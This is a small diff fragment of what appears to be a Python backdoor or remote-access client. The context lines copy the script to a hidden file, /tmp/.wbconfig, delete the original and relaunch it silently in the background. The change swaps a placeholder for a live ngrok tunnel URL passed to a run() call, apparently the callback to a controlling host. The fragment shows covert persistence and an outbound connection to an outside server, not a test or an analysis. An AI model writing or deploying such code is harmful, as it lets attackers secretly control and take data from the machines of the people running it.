@@ -17,4 +17,4 @@ except:
 	os.system('cp '+sys.argv[0]+' /tmp/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;python /tmp/.wbconfig running & 2>/dev/null')
 	sys.exit(0)
 
-run('LINK_NGROK')
+run('http://595c72cd.ngrok.io')
